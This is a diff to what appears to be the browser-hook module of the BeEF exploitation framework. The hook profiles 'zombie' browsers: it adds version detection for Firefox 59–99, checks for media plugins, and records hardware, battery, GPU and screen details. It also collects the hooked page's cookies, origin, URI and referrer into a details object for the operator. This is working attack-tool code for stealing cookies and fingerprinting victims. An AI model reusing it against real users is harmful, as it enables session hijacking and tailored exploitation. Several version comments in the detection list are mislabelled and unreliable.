@@ -20,6 +20,19 @@ beef.browser = {
     },
 
     /**
+     * Returns the underlying layout engine in use by the browser.
+     * @example: beef.browser.getBrowserEngine()
+     */
+    getBrowserEngine: function() {
+      try {
+        var engine = platform.layout;
+        if (!!engine)
+          return engine;
+      } catch (e) {}
+      return 'unknown';
+    },
+
+    /**
      * Returns true if Avant Browser.
      * @example: beef.browser.isA()
      */
@@ -88,7 +101,7 @@ beef.browser = {
      * @example: beef.browser.isIE9()
      */
     isIE9: function () {
-        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
+        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
     },
 
     /**
@@ -97,7 +110,7 @@ beef.browser = {
      * @example: beef.browser.isIE10()
      */
     isIE10: function () {
-        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
+        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
     },
 
     /**
@@ -2472,19 +2485,6 @@ beef.browser = {
     },
 
     /**
-     * Returns a hash of string keys representing a given capability
-     * @example: beef.browser.capabilities()["navigator.plugins"]
-     */
-    capabilities: function () {
-        var out = {};
-        var type = this.type();
-
-        out["navigator.plugins"] = (type.IE11 || !type.IE);
-
-        return out;
-    },
-
-    /**
      * Returns the type of browser being used.
      * @example: beef.browser.type().IE6
      * @example: beef.browser.type().FF
@@ -2649,6 +2649,48 @@ beef.browser = {
             FF56: this.isFF56(), // Firefox 56
             FF57: this.isFF57(), // Firefox 57
             FF58: this.isFF58(), // Firefox 58
+            FF59: this.isFF59(), // Firefox 59
+            FF60: this.isFF60(), // Firefox 60
+            FF61: this.isFF61(), // Firefox 61
+            FF62: this.isFF62(), // Firefox 62
+            FF63: this.isFF63(), // Firefox 63
+            FF64: this.isFF64(), // Firefox 64
+            FF65: this.isFF65(), // Firefox 65
+            FF66: this.isFF66(), // Firefox 66
+            FF67: this.isFF67(), // Firefox 67
+            FF68: this.isFF68(), // Firefox 68
+            FF69: this.isFF69(), // Firefox 69
+            FF70: this.isFF70(), // Firefox 70
+            FF71: this.isFF71(), // Firefox 71
+            FF72: this.isFF72(), // Firefox 72
+            FF73: this.isFF73(), // Firefox 73
+            FF74: this.isFF74(), // Firefox 74
+            FF75: this.isFF75(), // Firefox 75
+            FF76: this.isFF76(), // Firefox 76
+            FF77: this.isFF77(), // Firefox 77
+            FF78: this.isFF78(), // Firefox 78
+            FF79: this.isFF79(), // Firefox 79
+            FF80: this.isFF80(), // Firefox 70
+            FF81: this.isFF81(), // Firefox 81
+            FF82: this.isFF82(), // Firefox 82
+            FF83: this.isFF83(), // Firefox 83
+            FF84: this.isFF84(), // Firefox 85
+            FF85: this.isFF85(), // Firefox 85
+            FF86: this.isFF86(), // Firefox 85
+            FF87: this.isFF87(), // Firefox 87
+            FF88: this.isFF88(), // Firefox 85
+            FF89: this.isFF89(), // Firefox 85
+            FF90: this.isFF90(), // Firefox 80
+            FF91: this.isFF91(), // Firefox 95
+            FF92: this.isFF92(), // Firefox 92
+            FF93: this.isFF93(), // Firefox 95
+            FF94: this.isFF94(), // Firefox 94
+            FF95: this.isFF95(), // Firefox 95
+            FF96: this.isFF96(), // Firefox 96
+            FF97: this.isFF97(), // Firefox 97
+            FF98: this.isFF98(), // Firefox 98
+            FF99: this.isFF99(), // Firefox 99
+
             FF: this.isFF(),   // Firefox any version
 
             IE6: this.isIE6(), // Internet Explorer 6
@@ -2684,6 +2726,14 @@ beef.browser = {
      * @example: beef.browser.getBrowserVersion()
      */
     getBrowserVersion: function () {
+        if (this.isEdge()) {
+          try {
+            return platform.version;
+          } catch(e) {
+            return 'unknown';
+          }
+        }
+        ;   // Microsoft Edge
 
         if (this.isC5()) {
             return '5'
@@ -3299,6 +3349,170 @@ beef.browser = {
             return '58'
         }
         ;   // Firefox 58
+        if (this.isFF59()) {
+            return '59'
+        }
+        ;   // Firefox 59
+        if (this.isFF60()) {
+            return '60'
+        }
+        ;   // Firefox 60
+        if (this.isFF61()) {
+            return '61'
+        }
+        ;   // Firefox 61
+        if (this.isFF62()) {
+            return '62'
+        }
+        ;   // Firefox 62
+        if (this.isFF63()) {
+            return '63'
+        }
+        ;   // Firefox 63
+        if (this.isFF64()) {
+            return '64'
+        }
+        ;   // Firefox 64
+        if (this.isFF65()) {
+            return '65'
+        }
+        ;   // Firefox 65
+        if (this.isFF66()) {
+            return '66'
+        }
+        ;   // Firefox 66
+        if (this.isFF67()) {
+            return '67'
+        }
+        ;   // Firefox 67
+        if (this.isFF68()) {
+            return '68'
+        }
+        ;   // Firefox 68
+        if (this.isFF69()) {
+            return '69'
+        }
+        ;   // Firefox 69
+        if (this.isFF70()) {
+            return '70'
+        }
+        ;   // Firefox 70
+        if (this.isFF71()) {
+            return '71'
+        }
+        ;   // Firefox 71
+        if (this.isFF72()) {
+            return '72'
+        }
+        ;   // Firefox 72
+        if (this.isFF73()) {
+            return '73'
+        }
+        ;   // Firefox 73
+        if (this.isFF74()) {
+            return '74'
+        }
+        ;   // Firefox 74
+        if (this.isFF75()) {
+            return '75'
+        }
+        ;   // Firefox 75
+        if (this.isFF76()) {
+            return '76'
+        }
+        ;   // Firefox 76
+        if (this.isFF77()) {
+            return '77'
+        }
+        ;   // Firefox 77
+        if (this.isFF78()) {
+            return '78'
+        }
+        ;   // Firefox 78
+        if (this.isFF79()) {
+            return '79'
+        }
+        ;   // Firefox 79
+        if (this.isFF80()) {
+            return '80'
+        }
+        ;   // Firefox 80
+        if (this.isFF81()) {
+            return '81'
+        }
+        ;   // Firefox 81
+        if (this.isFF82()) {
+            return '82'
+        }
+        ;   // Firefox 82
+        if (this.isFF83()) {
+            return '83'
+        }
+        ;   // Firefox 83
+        if (this.isFF84()) {
+            return '84'
+        }
+        ;   // Firefox 84
+        if (this.isFF85()) {
+            return '85'
+        }
+        ;   // Firefox 85
+        if (this.isFF86()) {
+            return '86'
+        }
+        ;   // Firefox 86
+        if (this.isFF87()) {
+            return '87'
+        }
+        ;   // Firefox 87
+        if (this.isFF88()) {
+            return '88'
+        }
+        ;   // Firefox 88
+        if (this.isFF89()) {
+            return '89'
+        }
+        ;   // Firefox 89
+        if (this.isFF90()) {
+            return '90'
+        }
+        ;   // Firefox 90
+        if (this.isFF91()) {
+            return '91'
+        }
+        ;   // Firefox 91
+        if (this.isFF92()) {
+            return '92'
+        }
+        ;   // Firefox 92
+        if (this.isFF93()) {
+            return '93'
+        }
+        ;   // Firefox 93
+        if (this.isFF94()) {
+            return '94'
+        }
+        ;   // Firefox 94
+        if (this.isFF95()) {
+            return '95'
+        }
+        ;   // Firefox 95
+        if (this.isFF96()) {
+            return '96'
+        }
+        ;   // Firefox 96
+        if (this.isFF97()) {
+            return '97'
+        }
+        ;   // Firefox 97
+        if (this.isFF98()) {
+            return '98'
+        }
+        ;   // Firefox 98
+        if (this.isFF99()) {
+            return '99'
+        }
+        ;   // Firefox 99
 
         if (this.isIE6()) {
             return '6'
@@ -3385,6 +3599,13 @@ beef.browser = {
         }
         ;	// Opera 12.xx
 
+        // platform.js
+        try {
+          var version = platform.version;
+          if (!!version)
+            return version;
+        } catch (e) {}
+
         return 'UNKNOWN';				// Unknown UA
     },
 
@@ -3395,7 +3616,10 @@ beef.browser = {
      * @example: beef.browser.getBrowserName()
      */
     getBrowserName: function () {
-
+        if (this.isEdge()) {
+            return 'E'
+        }
+        ;       // Microsoft Edge any version
         if (this.isC()) {
             return 'C'
         }
@@ -3408,10 +3632,6 @@ beef.browser = {
             return 'IE'
         }
         ;		// Internet Explorer any version
-        if (this.isEdge()) {
-            return 'E'
-        }
-        ;       // Microsoft Edge any version
         if (this.isO()) {
             return 'O'
         }
@@ -3474,31 +3694,30 @@ beef.browser = {
      * @example: if(beef.browser.hasFlash()) { ... }
      */
     hasFlash: function () {
-        if (!this.type().IE) {
-            return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]);
-        } else {
-            flash_versions = 12;
-            flash_installed = false;
+      if (!beef.browser.isIE()) {
+        return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]);
+      }
 
+      if (!!navigator.plugins) {
+        return (navigator.plugins["Shockwave Flash"] != undefined);
+      }
 
-            if (this.type().IE11) {
-                flash_installed = (navigator.plugins["Shockwave Flash"] != undefined);
-            } else {
-                if (window.ActiveXObject != null) {
-                    for (x = 2; x <= flash_versions; x++) {
-                        try {
-                            Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
-                            if (Flash) {
-                                flash_installed = true;
-                            }
-                        } catch (e) {
-                            beef.debug("Creating Flash ActiveX object failed: " + e.message);
-                        }
-                    }
-                }
+      // IE
+      var flash_versions = 12;
+      if (window.ActiveXObject != null) {
+        for (x = 2; x <= flash_versions; x++) {
+          try {
+            Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
+            if (Flash) {
+              return true;
             }
-            return flash_installed;
+          } catch (e) {
+            beef.debug("Creating Flash ActiveX object failed: " + e.message);
+          }
         }
+      }
+
+      return false;
     },
 
     /**
@@ -3508,38 +3727,25 @@ beef.browser = {
      * @example: if ( beef.browser.hasQuickTime() ) { ... }
      */
     hasQuickTime: function () {
-
-        var quicktime = false;
-
-        if (this.capabilities()["navigator.plugins"]) {
-
+        if (!!navigator.plugins) {
             for (i = 0; i < navigator.plugins.length; i++) {
-
                 if (navigator.plugins[i].name.indexOf("QuickTime") >= 0) {
-                    quicktime = true;
+                    return true;
                 }
-
             }
-
-            // Has navigator.plugins
-        } else {
-
-            try {
-
-                var qt_test = new ActiveXObject('QuickTime.QuickTime');
-
-            } catch (e) {
-                beef.debug("Creating QuickTime ActiveX object failed: " + e.message);
-            }
-
-            if (qt_test) {
-                quicktime = true;
-            }
-
         }
 
-        return quicktime;
+        // IE
+        try {
+          var qt_test = new ActiveXObject('QuickTime.QuickTime');
+          if (qt_test) {
+            return true;
+          }
+        } catch (e) {
+          beef.debug("Creating QuickTime ActiveX object failed: " + e.message);
+        }
 
+        return false;
     },
 
     /**
@@ -3550,47 +3756,35 @@ beef.browser = {
      */
     hasRealPlayer: function () {
 
-        var realplayer = false;
-
-        if (this.capabilities()["navigator.plugins"]) {
-
-
-            for (i = 0; i < navigator.plugins.length; i++) {
-
-                if (navigator.plugins[i].name.indexOf("RealPlayer") >= 0) {
-                    realplayer = true;
-                }
-
+        if (!!navigator.plugins) {
+          for (i = 0; i < navigator.plugins.length; i++) {
+            if (navigator.plugins[i].name.indexOf("RealPlayer") >= 0) {
+              return true;
             }
-
-            // has navigator.plugins
-        } else {
-
-            var definedControls = [
-                'RealPlayer',
-                'rmocx.RealPlayer G2 Control',
-                'rmocx.RealPlayer G2 Control.1',
-                'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)',
-                'RealVideo.RealVideo(tm) ActiveX Control (32-bit)'
-            ];
-
-            for (var i = 0; i < definedControls.length; i++) {
-
-                try {
-                    var rp_test = new ActiveXObject(definedControls[i]);
-                } catch (e) {
-                    beef.debug("Creating RealPlayer ActiveX object failed: " + e.message);
-                }
-
-                if (rp_test) {
-                    realplayer = true;
-
-                }
-            }
+          }
         }
 
-        return realplayer;
+        // IE
+        var definedControls = [
+          'RealPlayer',
+          'rmocx.RealPlayer G2 Control',
+          'rmocx.RealPlayer G2 Control.1',
+          'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)',
+          'RealVideo.RealVideo(tm) ActiveX Control (32-bit)'
+        ];
 
+        for (var i = 0; i < definedControls.length; i++) {
+          try {
+            var rp_test = new ActiveXObject(definedControls[i]);
+            if (rp_test) {
+              return true;
+            }
+          } catch (e) {
+            beef.debug("Creating RealPlayer ActiveX object failed: " + e.message);
+          }
+        }
+
+        return false;
     },
 
     /**
@@ -3600,39 +3794,25 @@ beef.browser = {
      * @example: if ( beef.browser.hasWMP() ) { ... }
      */
     hasWMP: function () {
-
-        var wmp = false;
-
-        if (this.capabilities()["navigator.plugins"]) {
-
-
-            for (i = 0; i < navigator.plugins.length; i++) {
-
-                if (navigator.plugins[i].name.indexOf("Windows Media Player") >= 0) {
-                    wmp = true;
-                }
-
-            }
-
-            // Has navigator.plugins
-        } else {
-
-            try {
-
-                var wmp_test = new ActiveXObject('WMPlayer.OCX');
-
-            } catch (e) {
-                beef.debug("Creating WMP ActiveX object failed: " + e.message);
-            }
-
-            if (wmp_test) {
-                wmp = true;
-            }
-
+      if (!!navigator.plugins) {
+        for (i = 0; i < navigator.plugins.length; i++) {
+          if (navigator.plugins[i].name.indexOf("Windows Media Player") >= 0) {
+            return true;
+          }
         }
+      }
 
-        return wmp;
+      // IE
+      try {
+        var wmp_test = new ActiveXObject('WMPlayer.OCX');
+        if (wmp_test) {
+          return true;
+        }
+      } catch (e) {
+        beef.debug("Creating WMP ActiveX object failed: " + e.message);
+      }
 
+      return false;
     },
 
     /**
@@ -3640,22 +3820,21 @@ beef.browser = {
      *  @return: {Boolean} true or false
      **/
     hasVLC: function () {
-        var vlc = false;
-        if (!this.type().IE) {
-            for (i = 0; i < navigator.plugins.length; i++) {
-                if (navigator.plugins[i].name.indexOf("VLC") >= 0) {
-                    vlc = true;
-                }
-            }
-        } else {
-            try {
-                control = new ActiveXObject("VideoLAN.VLCPlugin.2");
-                vlc = true;
-            } catch (e) {
-                beef.debug("Creating VLC ActiveX object failed: " + e.message);
-            }
+      if (beef.browser.isIE() || beef.browser.isEdge()) {
+        try {
+          control = new ActiveXObject("VideoLAN.VLCPlugin.2");
+          return true;
+        } catch (e) {
+          beef.debug("Creating VLC ActiveX object failed: " + e.message);
         }
-        return vlc;
+      } else {
+        for (i = 0; i < navigator.plugins.length; i++) {
+          if (navigator.plugins[i].name.indexOf("VLC") >= 0) {
+            return true;
+          }
+        }
+      }
+      return false;
     },
 
     /**
@@ -3665,9 +3844,7 @@ beef.browser = {
      * @example: if(beef.browser.javaEnabled()) { ... }
      */
     javaEnabled: function () {
-
-        return navigator.javaEnabled();
-
+      return navigator.javaEnabled();
     },
 
     /**
@@ -3745,10 +3922,11 @@ beef.browser = {
         };
 
         // Things lacking navigator.plugins
-        if (!this.capabilities()["navigator.plugins"]) results = this.getPluginsIE();
+        if (!navigator.plugins) 
+          return this.getPluginsIE();
 
         // All other browsers that support navigator.plugins
-        else if (navigator.plugins && navigator.plugins.length > 0) {
+        if (navigator.plugins && navigator.plugins.length > 0) {
             results = new Array();
             for (var i = 0; i < navigator.plugins.length; i++) {
 
@@ -3973,17 +4151,6 @@ beef.browser = {
     },
 
     /**
-     * Returns zombie screen size and color depth.
-     */
-    getScreenSize: function () {
-        return {
-            width: window.screen.width,
-            height: window.screen.height,
-            colordepth: window.screen.colorDepth
-        }
-    },
-
-    /**
      * Returns zombie browser window size.
      * @from: http://www.howtocreate.co.uk/tutorials/javascript/browserwindow
      */
@@ -4016,41 +4183,63 @@ beef.browser = {
 
         var browser_name = beef.browser.getBrowserName();
         var browser_version = beef.browser.getBrowserVersion();
+        var browser_engine = beef.browser.getBrowserEngine();
         var browser_reported_name = beef.browser.getBrowserReportedName();
         var browser_language = beef.browser.getBrowserLanguage();
         var page_title = (document.title) ? document.title : "Unknown";
+        var origin = (window.origin) ? window.origin : "Unknown";
         var page_uri = (document.location.href) ? document.location.href : "Unknown";
         var page_referrer = (document.referrer) ? document.referrer : "Unknown";
-        var hostname = (document.location.hostname) ? document.location.hostname : "Unknown";
+        var page_hostname = (document.location.hostname) ? document.location.hostname : "Unknown";
+        var default_port = "";
         switch (document.location.protocol) {
         case "http:":
             var default_port = "80";
             break;
         case "https:":
             var default_port = "443";
-            break
-        default:
-            var default_port = "";
+            break;
         }
-        var hostport = (document.location.port) ? document.location.port : default_port;
+        var page_hostport = (document.location.port) ? document.location.port : default_port;
         var browser_plugins = beef.browser.getPlugins();
         var date_stamp = new Date().toString();
         var os_name = beef.os.getName();
+        var os_family = beef.os.getFamily();
         var os_version = beef.os.getVersion();
+        var os_arch = beef.os.getArch();
         var default_browser = beef.os.getDefaultBrowser();
-        var hw_name = beef.hardware.getName();
-        var cpu_type = beef.hardware.cpuType();
+        var hw_type = beef.hardware.getName();
+        var battery_details = beef.hardware.getBatteryDetails();
+        try {
+          var battery_charging_status = battery_details.chargingStatus;
+          var battery_level = battery_details.batteryLevel;
+          var battery_charging_time = battery_details.chargingTime;
+          var battery_discharging_time = battery_details.dischargingTime;
+        } catch(e) {}
+        var memory = beef.hardware.getMemory();
+        var cpu_arch = beef.hardware.getCpuArch();
+        var cpu_cores = beef.hardware.getCpuCores();
+        var gpu_details = beef.hardware.getGpuDetails();
+        try {
+          var gpu = gpu_details.gpu;
+          var gpu_vendor = gpu_details.vendor;
+        } catch(e) {}
         var touch_enabled = (beef.hardware.isTouchEnabled()) ? "Yes" : "No";
         var browser_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : 'Unknown';
-        var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {
-            if (value == true) return value;
-            else if (typeof value == 'object') return value;
-            else return undefined;
-        });
-        var screen_size = beef.browser.getScreenSize();
+        var screen_size = beef.hardware.getScreenSize();
+        try {
+          var screen_width = screen_size.width;
+          var screen_height = screen_size.height;
+          var screen_colordepth = screen_size.colordepth;
+        } catch(e) {}
         var window_size = beef.browser.getWindowSize();
+        try {
+          window_width = window_size.width;
+          window_height = window_size.height;
+        } catch(e) {}
         var vbscript_enabled = (beef.browser.hasVBScript()) ? "Yes" : "No";
         var has_flash = (beef.browser.hasFlash()) ? "Yes" : "No";
+        var has_silverlight = (beef.browser.hasSilverlight()) ? "Yes" : "No";
         var has_phonegap = (beef.browser.hasPhonegap()) ? "Yes" : "No";
         var has_googlegears = (beef.browser.hasGoogleGears()) ? "Yes" : "No";
         var has_web_socket = (beef.browser.hasWebSocket()) ? "Yes" : "No";
@@ -4061,49 +4250,75 @@ beef.browser = {
         var has_quicktime = (beef.browser.hasQuickTime()) ? "Yes" : "No";
         var has_realplayer = (beef.browser.hasRealPlayer()) ? "Yes" : "No";
         var has_wmp = (beef.browser.hasWMP()) ? "Yes" : "No";
+        var has_vlc = (beef.browser.hasVLC()) ? "Yes" : "No";
+
         try {
             var cookies = document.cookie;
             /* Never stop the madness dear C.
              * var veglol = beef.browser.cookie.veganLol();
              */
-            if (cookies) details['Cookies'] = cookies;
+            if (cookies) details['browser.window.cookies'] = cookies;
         } catch (e) {
-            details['Cookies'] = "Cookies can't be read. The hooked origin is most probably using HttpOnly.";
+            beef.debug("Cookies can't be read. The hooked origin is most probably using HttpOnly.");
+            details['browser.window.cookies'] = '';
         }
 
-        if (browser_name) details['BrowserName'] = browser_name;
-        if (browser_version) details['BrowserVersion'] = browser_version;
-        if (browser_reported_name) details['BrowserReportedName'] = browser_reported_name;
-        if (browser_language) details['BrowserLanguage'] = browser_language;
-        if (page_title) details['PageTitle'] = page_title;
-        if (page_uri) details['PageURI'] = page_uri;
-        if (page_referrer) details['PageReferrer'] = page_referrer;
-        if (hostname) details['HostName'] = hostname;
-        if (hostport) details['HostPort'] = hostport;
-        if (browser_plugins) details['BrowserPlugins'] = browser_plugins;
-        if (os_name) details['OsName'] = os_name;
-        if (os_version) details['OsVersion'] = os_version;
-        if (default_browser) details['DefaultBrowser'] = default_browser;
-        if (hw_name) details['Hardware'] = hw_name;
-        if (cpu_type) details['CPU'] = cpu_type;
-        if (touch_enabled) details['TouchEnabled'] = touch_enabled;
-        if (date_stamp) details['DateStamp'] = date_stamp;
-        if (browser_platform) details['BrowserPlatform'] = browser_platform;
-        if (browser_type) details['BrowserType'] = browser_type;
-        if (screen_size) details['ScreenSize'] = screen_size;
-        if (window_size) details['WindowSize'] = window_size;
-        if (vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled;
-        if (has_flash) details['HasFlash'] = has_flash;
-        if (has_phonegap) details['HasPhonegap'] = has_phonegap;
-        if (has_web_socket) details['HasWebSocket'] = has_web_socket;
-        if (has_web_worker) details['HasWebWorker'] = has_web_worker;
-        if (has_web_gl) details['HasWebGL'] = has_web_gl;
-        if (has_googlegears) details['HasGoogleGears'] = has_googlegears;
-        if (has_webrtc) details['HasWebRTC'] = has_webrtc;
-        if (has_activex) details['HasActiveX'] = has_activex;
-        if (has_quicktime) details['HasQuickTime'] = has_quicktime;
-        if (has_realplayer) details['HasRealPlayer'] = has_realplayer;
-        if (has_wmp) details['HasWMP'] = has_wmp;
+        if (browser_name) details['browser.name'] = browser_name;
+        if (browser_version) details['browser.version'] = browser_version;
+        if (browser_engine) details['browser.engine'] = browser_engine;
+        if (browser_reported_name) details['browser.name.reported'] = browser_reported_name;
+        if (browser_platform) details['browser.platform'] = browser_platform;
+        if (browser_language) details['browser.language'] = browser_language;
+        if (browser_plugins) details['browser.plugins'] = browser_plugins;
+
+        if (page_title) details['browser.window.title'] = page_title;
+        if (origin) details['browser.window.origin'] = origin;
+        if (page_hostname) details['browser.window.hostname'] = page_hostname;
+        if (page_hostport) details['browser.window.hostport'] = page_hostport;
+        if (page_uri) details['browser.window.uri'] = page_uri;
+        if (page_referrer) details['browser.window.referrer'] = page_referrer;
+        if (window_width) details['browser.window.size.width'] = window_width;
+        if (window_height) details['browser.window.size.height'] = window_height;
+        if (date_stamp) details['browser.date.datestamp'] = date_stamp;
+
+        if (os_name) details['host.os.name'] = os_name;
+        if (os_family) details['host.os.family'] = os_family;
+        if (os_version) details['host.os.version'] = os_version;
+        if (os_arch) details['host.os.arch'] = os_arch;
+
+        if (default_browser) details['host.software.defaultbrowser'] = default_browser;
+
+        if (hw_type) details['hardware.type'] = hw_type;
+        if (memory) details['hardware.memory'] = memory;
+        if (gpu) details['hardware.gpu'] = gpu;
+        if (gpu_vendor) details['hardware.gpu.vendor'] = gpu_vendor;
+        if (cpu_arch) details['hardware.cpu.arch'] = cpu_arch;
+        if (cpu_cores) details['hardware.cpu.cores'] = cpu_cores;
+
+        if (battery_charging_status) details['hardware.battery.chargingstatus'] = battery_charging_status;
+        if (battery_level) details['hardware.battery.level'] = battery_level;
+        if (battery_charging_time) details['hardware.battery.chargingtime'] = battery_charging_time;
+        if (battery_discharging_time) details['hardware.battery.dischargingtime'] = battery_discharging_time;
+
+        if (screen_width) details['hardware.screen.size.width'] = screen_width;
+        if (screen_height) details['hardware.screen.size.height'] = screen_height;
+        if (screen_colordepth) details['hardware.screen.colordepth'] = screen_colordepth;
+        if (touch_enabled) details['hardware.screen.touchenabled'] = touch_enabled;
+
+        if (vbscript_enabled) details['browser.capabilities.vbscript'] = vbscript_enabled;
+        if (has_flash) details['browser.capabilities.flash'] = has_flash;
+        if (has_silverlight) details['browser.capabilities.silverlight'] = has_silverlight;
+        if (has_phonegap) details['browser.capabilities.phonegap'] = has_phonegap;
+        if (has_web_socket) details['browser.capabilities.websocket'] = has_web_socket;
+        if (has_webrtc) details['browser.capabilities.webrtc'] = has_webrtc;
+        if (has_web_worker) details['browser.capabilities.webworker'] = has_web_worker;
+        if (has_web_gl) details['browser.capabilities.webgl'] = has_web_gl;
+        if (has_googlegears) details['browser.capabilities.googlegears'] = has_googlegears;
+        if (has_activex) details['browser.capabilities.activex'] = has_activex;
+        if (has_quicktime) details['browser.capabilities.quicktime'] = has_quicktime;
+        if (has_realplayer) details['browser.capabilities.realplayer'] = has_realplayer;
+        if (has_wmp) details['browser.capabilities.wmp'] = has_wmp;
+        if (has_vlc) details['browser.capabilities.vlc'] = has_vlc;
 
         var pf_integration = "<%= @phishing_frenzy_enable %>";
         if (pf_integration) {
@@ -4147,7 +4362,7 @@ beef.browser = {
         var result = false;
 
         try {
-            if (beef.browser.isIE()) {
+            if (beef.browser.hasActiveX()) {
                 var slControl = new ActiveXObject('AgControl.AgControl');
                 result = true;
             } else if (navigator.plugins["Silverlight Plug-In"]) {
@@ -4280,7 +4495,7 @@ beef.browser = {
         var foxitplugin = false;
 
         try {
-            if (beef.browser.isIE()) {
+            if (beef.browser.hasActiveX()) {
                 var foxitControl = new ActiveXObject('FoxitReader.FoxitReaderCtl.1');
                 foxitplugin = true;
             } else if (navigator.plugins['Foxit Reader Plugin for Mozilla']) {
